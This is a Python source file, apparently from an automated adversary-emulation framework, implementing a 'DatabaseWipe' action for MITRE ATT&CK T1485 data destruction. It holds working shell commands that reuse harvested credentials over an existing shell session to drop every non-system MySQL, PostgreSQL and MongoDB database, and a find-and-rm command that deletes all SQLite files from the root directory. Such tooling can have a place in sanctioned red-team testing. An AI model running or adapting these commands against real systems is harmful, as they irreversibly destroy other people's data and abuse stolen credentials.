
import time

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation


class DatabaseWipe(Action):
    """
    Implementation of T1485 Data Destruction - Database Wiping.
    
    This action performs database wiping on Linux systems by dropping databases
    using database-specific commands. Supports MySQL/MariaDB, PostgreSQL, SQLite, and MongoDB.
    """

    def __init__(self):
        super().__init__(
            "DatabaseWipe", "T1485", "TA0040", ["loud", "slow"]
        )
        self.noise = 1.0
        self.impact = 1.0
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for DatabaseWipe.

        Requires:
        - A database service (mysql, postgresql, mongodb, etc.) on an asset
        - A shell session (SSH, shell, busybox) on the same asset (for running commands)
        - Credentials from any service on the same asset (can be reused from FTP, etc.)
        - A user matching the credentials username from the same service as the credentials
        """
        input_motif = ActionInputMotif(
            name="InputMotif_DatabaseWipe",
            description="Input motif for DatabaseWipe"
        )

        input_motif.add_template(
            entity=Entity('Asset', alias='asset'),
            template_name="existing_asset",
        )

        # Database service on the asset
        input_motif.add_template(
            entity=Entity('OpenPort', alias='db_port'),
            template_name="existing_db_port",
            relationship_type="has",
            match_on="existing_asset",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Service', alias='db_service'),
            template_name="existing_db_service",
            relationship_type="is_running",
            match_on="existing_db_port",
            invert_relationship=True,
        )

        # Session from any service on the same asset (can be FTP, SSH, etc.)
        input_motif.add_template(
            entity=Entity('OpenPort', alias='session_port'),
            template_name="existing_session_port",
            relationship_type="has",
            match_on="existing_asset",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Service', alias='session_service'),
            template_name="existing_session_service",
            relationship_type="is_running",
            match_on="existing_session_port",
            invert_relationship=True,
        )

        # Session executing on any service (FTP, SSH, etc.)
        input_motif.add_template(
            entity=Entity('Session', alias='session', active=True),
            template_name="existing_session",
            relationship_type="executes_on",
            match_on="existing_session_service",
        )

        # Credentials from any service on the asset (can be reused from FTP, etc.)
        input_motif.add_template(
            entity=Entity('OpenPort', alias='cred_port'),
            template_name="existing_cred_port",
            relationship_type="has",
            match_on="existing_asset",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Service', alias='cred_service'),
            template_name="existing_cred_service",
            relationship_type="is_running",
            match_on="existing_cred_port",
            invert_relationship=True,
        )

        input_motif.add_template(
            entity=Entity('Credentials', alias='credentials'),
            template_name="existing_credentials",
            relationship_type="secured_with",
            match_on="existing_cred_service",
            invert_relationship=False,
            expected_attributes=["username", "password"],
        )

        # User from the same service as the credentials
        input_motif.add_template(
            entity=Entity('User', alias='user'),
            template_name="existing_user",
            relationship_type="is_client",
            match_on="existing_cred_service",
            invert_relationship=False,
        )

        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for DatabaseWipe.
        
        Updates the database service to mark it as wiped when successful.
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_DatabaseWipe",
            description="Output motif for DatabaseWipe"
        )
        
        # Template to update the database service with wiped=true
        output_motif.add_template(
            template_name="wiped_db_service",
            entity=Entity("Service", alias="db_service"),
            operation=StateChangeOperation.UPDATE,
            expected_attributes=["wiped"],
        )
        
        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        asset_ip = pattern.get('asset').get('ip_address')
        db_service = pattern.get('db_service')
        service_protocol = db_service.get('protocol')
        session = pattern.get('session').get('id')
        credentials = pattern.get('credentials')
        username = credentials.get('username') if credentials else 'default'
        session_service = pattern.get('session_service')
        session_service_protocol = session_service.get('protocol') if session_service else 'unknown'
        cred_service = pattern.get('cred_service')
        cred_service_protocol = cred_service.get('protocol') if cred_service else 'unknown'
        return [
            f"Destroy all databases on {service_protocol} service on {asset_ip} using {session_service_protocol} session ({session}) with credentials for user {username} (from {cred_service_protocol} service)"
        ]

    def get_target_query(self) -> Query:
        """
        Get target patterns for database wiping.
        This action targets database services on assets that have active shell sessions and credentials.
        """
        query = self.input_motif.get_query()
        # Target common database service protocols
        query.where(
            self.input_motif.get_template('existing_db_service').entity.protocol.is_in([
                'mysql', 'postgresql', 'mongodb', 'mssql', 'sqlite'
            ])
        )
        # Target shell-capable service protocols (for running database commands)
        query.where(
            self.input_motif.get_template('existing_session_service').entity.protocol.is_in([
                'ssh', 'shell', 'busybox'
            ])
        )
        # Ensure session is shell-capable
        query.where(
            self.input_motif.get_template('existing_session').entity.protocol.is_in([
                'ssh', 'shell', 'busybox'
            ])
        )
        # Ensure credentials username matches user username
        query.where(
            self.input_motif.get_template('existing_user').entity.username ==
            self.input_motif.get_template('existing_credentials').entity.username
        )
        query.where(
            self.input_motif.get_template('existing_db_service').entity.wiped.is_null()
        )
        query.ret_all()
        return query

    def _build_file_based_wipe_cmd(self, search_paths: list[str], message_prefix: str = "Removed database") -> str:
        """
        Build a command to find and remove database files.
        
        Args:
            search_paths: List of directory paths to search (e.g., ['/'] or ['/var/lib', '/opt'])
            message_prefix: Prefix for the success message (e.g., "Removed database" or "Removed database file")
        
        Returns:
            Shell command string to find and remove database files
        """
        paths_str = " ".join(search_paths)
        return f"""find {paths_str} \\( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \\) 2>/dev/null | while read db; do rm -f "$db" && echo "{message_prefix}: $db"; done"""

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute database wiping commands.
        
        Wipes all databases on a service by:
        1. Detecting database type from service protocol
        2. Executing appropriate DROP DATABASE commands for all databases
        3. For SQLite, removing all database files
        
        Returns ActionExecutionResult with detailed output including error messages.
        """
        tulpa_session = pattern.get('session')
        tulpa_session_id = tulpa_session.get('id')
        live_session = sessions.get_session(tulpa_session_id)
        
        db_service = pattern.get('db_service')
        service_protocol = db_service.get('protocol').lower() if db_service and db_service.get('protocol') else ''
        credentials = pattern.get('credentials')
        username = credentials.get('username') if credentials else None
        password = credentials.get('password') if credentials else None
        
        commands_executed = []
        output_lines = []
        output_lines.append(f"Attempting to wipe {service_protocol.upper()} databases...")
        
        if service_protocol in ['mysql', 'mariadb']:
            db_user = username if username else 'root'
            output_lines.append(f"Connecting to MySQL/MariaDB as user: {db_user}")
            
            if password:
                mysql_cmd = f"mysql -u {db_user} -p'{password}' -e \"SHOW DATABASES;\" 2>&1 | grep -v -E '^(Database|information_schema|mysql|performance_schema|sys)$' | while read db; do mysql -u {db_user} -p'{password}' -e \"DROP DATABASE IF EXISTS \\`$db\\`;\" 2>&1 && echo \"Dropped database: $db\" || echo \"ERROR: Failed to drop database: $db\"; done; echo \"DATABASE_WIPE_COMPLETE_MYSQL\""
            else:
                mysql_cmd = f"mysql -u {db_user} -e \"SHOW DATABASES;\" 2>&1 | grep -v -E '^(Database|information_schema|mysql|performance_schema|sys)$' | while read db; do mysql -u {db_user} -e \"DROP DATABASE IF EXISTS \\`$db\\`;\" 2>&1 && echo \"Dropped database: $db\" || echo \"ERROR: Failed to drop database: $db\"; done; echo \"DATABASE_WIPE_COMPLETE_MYSQL\""
            try:
                channel = live_session.get_session_object()
                if channel:
                    channel.send(mysql_cmd + "\n")
                    commands_executed.append(mysql_cmd)
                    
                    completion_marker = "DATABASE_WIPE_COMPLETE_MYSQL"
                    output = []
                    start_time = time.time()
                    timeout = 15.0
                    
                    channel.settimeout(0.1)
                    
                    while time.time() - start_time < timeout:
                        try:
                            data = channel.recv(4096).decode('utf-8', errors='ignore')
                            if data:
                                output.append(data)
                                output_str = ''.join(output)
                                if f'\n{completion_marker}\n' in output_str or \
                                   output_str.endswith(f'\n{completion_marker}') or \
                                   output_str.startswith(f'{completion_marker}\n'):
                                    break
                        except:
                            time.sleep(0.1)
                            continue
                    
                    channel.settimeout(None)
                    output_str = ''.join(output).replace("\r", "")
                    output_lines.append(output_str)
                else:
                    output = live_session.run_command(mysql_cmd)
                    commands_executed.append(mysql_cmd)
                    output_lines.append(output)
            except Exception as e:
                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
                return ActionExecutionResult(
                    command=[mysql_cmd],
                    stdout="\n".join(output_lines),
                    exit_status=1,
                    session=tulpa_session_id
                )
        
        elif service_protocol == 'postgresql':
            db_user = username if username else 'postgres'
            output_lines.append(f"Connecting to PostgreSQL as user: {db_user}")
            
            if password:
                psql_cmd = f"PGPASSWORD='{password}' psql -h localhost -U {db_user} -lqt 2>&1 | cut -d \\| -f 1 | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | grep -v -E '^(template0|template1|postgres|Name)$' | while read db; do [ -n \"$db\" ] && (PGPASSWORD='{password}' psql -h localhost -U {db_user} -c \"DROP DATABASE IF EXISTS \\\"$db\\\";\" 2>&1 && echo \"Dropped database: $db\" || echo \"ERROR: Failed to drop database: $db\"); done; echo \"DATABASE_WIPE_COMPLETE_POSTGRES\""
            else:
                psql_cmd = f"psql -h localhost -U {db_user} -lqt 2>&1 | cut -d \\| -f 1 | sed 's/^[[:space:]]*//' | sed 's/[[:space:]]*$//' | grep -v -E '^(template0|template1|postgres|Name)$' | while read db; do [ -n \"$db\" ] && (psql -h localhost -U {db_user} -c \"DROP DATABASE IF EXISTS \\\"$db\\\";\" 2>&1 && echo \"Dropped database: $db\" || echo \"ERROR: Failed to drop database: $db\"); done; echo \"DATABASE_WIPE_COMPLETE_POSTGRES\""
            try:
                channel = live_session.get_session_object()
                if channel:
                    channel.send(psql_cmd + "\n")
                    commands_executed.append(psql_cmd)
                    
                    completion_marker = "DATABASE_WIPE_COMPLETE_POSTGRES"
                    output = []
                    start_time = time.time()
                    timeout = 15.0
                    
                    channel.settimeout(0.1)
                    
                    while time.time() - start_time < timeout:
                        try:
                            data = channel.recv(4096).decode('utf-8', errors='ignore')
                            if data:
                                output.append(data)
                                output_str = ''.join(output)
                                if f'\n{completion_marker}\n' in output_str or \
                                   output_str.endswith(f'\n{completion_marker}') or \
                                   output_str.startswith(f'{completion_marker}\n'):
                                    break
                        except:
                            time.sleep(0.1)
                            continue
                    
                    channel.settimeout(None)
                    output_str = ''.join(output).replace("\r", "")
                    output_lines.append(output_str)
                else:
                    output = live_session.run_command(psql_cmd)
                    commands_executed.append(psql_cmd)
                    output_lines.append(output)
            except Exception as e:
                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
                return ActionExecutionResult(
                    command=[psql_cmd],
                    stdout="\n".join(output_lines),
                    exit_status=1,
                    session=tulpa_session_id
                )
        
        elif service_protocol == 'mongodb':
            output_lines.append(f"Connecting to MongoDB as user: {username if username else 'anonymous'}")
            
            if username and password:
                mongo_cmd = f"""mongo --quiet -u {username} -p '{password}' --authenticationDatabase admin --eval "db.adminCommand('listDatabases').databases.forEach(function(d){{if(!['admin','config','local'].includes(d.name)){{db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}}}})" 2>&1"""
            elif username:
                mongo_cmd = f"""mongo --quiet -u {username} --eval "db.adminCommand('listDatabases').databases.forEach(function(d){{if(!['admin','config','local'].includes(d.name)){{db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}}}})" 2>&1"""
            else:
                mongo_cmd = """mongo --quiet --eval "db.adminCommand('listDatabases').databases.forEach(function(d){if(!['admin','config','local'].includes(d.name)){db.getSiblingDB(d.name).dropDatabase();print('Dropped database: '+d.name);}})" 2>&1"""
            try:
                output = live_session.run_command(mongo_cmd)
                commands_executed.append(mongo_cmd)
                for line in output.split('\n'):
                    if line.strip():
                        output_lines.append(line)
            except Exception as e:
                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
                return ActionExecutionResult(
                    command=[mongo_cmd],
                    stdout="\n".join(output_lines),
                    exit_status=1,
                    session=tulpa_session_id
                )
        
        elif service_protocol == 'sqlite':
            output_lines.append("Searching for SQLite database files...")
            sqlite_cmd = self._build_file_based_wipe_cmd(['/'], "Removed database")
            try:
                output = live_session.run_command(sqlite_cmd)
                commands_executed.append(sqlite_cmd)
                for line in output.split('\n'):
                    if line.strip():
                        output_lines.append(line)
            except Exception as e:
                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
                return ActionExecutionResult(
                    command=[sqlite_cmd],
                    stdout="\n".join(output_lines),
                    exit_status=1,
                    session=tulpa_session_id
                )
        
        else:
            output_lines.append(f"Unknown database type '{service_protocol}', attempting generic file-based wipe...")
            generic_cmd = self._build_file_based_wipe_cmd(['/var/lib', '/opt', '/usr/local'], "Removed database file")
            try:
                output = live_session.run_command(generic_cmd)
                commands_executed.append(generic_cmd)
                for line in output.split('\n'):
                    if line.strip():
                        output_lines.append(line)
            except Exception as e:
                output_lines.append(f"ERROR: Session closed or command failed: {str(e)}")
                return ActionExecutionResult(
                    command=[generic_cmd],
                    stdout="\n".join(output_lines),
                    exit_status=1,
                    session=tulpa_session_id
                )
        
        all_lines = []
        for output_item in output_lines:
            all_lines.extend(output_item.split('\n'))
        
        has_success = any(line.strip().startswith("Dropped database:") for line in all_lines)
        exit_status = 0 if has_success else 1
        
        if has_success:
            output_lines.append("SUCCESS: Databases were successfully wiped")
        else:
            output_lines.append("FAILED: No databases were wiped")
        
        stdout = "\n".join(output_lines) if output_lines else "No databases found or wiped"
        
        return ActionExecutionResult(
            command=commands_executed,
            stdout=stdout,
            exit_status=exit_status,
            session=tulpa_session_id
        )

    def parse_output(self, output: ActionExecutionResult) -> dict:
        has_success_message = any(line.strip().startswith("Dropped database:") for line in output.stdout.split("\n"))
        success = has_success_message and output.exit_status == 0
        return {"success": success, "wiped": success}

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
        self.output_motif.reset_context()
        changes: StateChangeSequence = []
        
        if discovered_data.get("success") is True:
            db_service = pattern.get("db_service")
            if db_service:
                service_change = self.output_motif.instantiate(
                    template_name="wiped_db_service",
                    match_on_override=db_service,
                    wiped=True,
                )
                changes.append(service_change)
        
        return changes

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Capture state changes from database wiping.
        
        Marks the database service as wiped (wiped=true) when the wipe operation was successful.
        """
        discovered_data = self.parse_output(output)
        changes = self.populate_output_motif(pattern, discovered_data)
        return changes
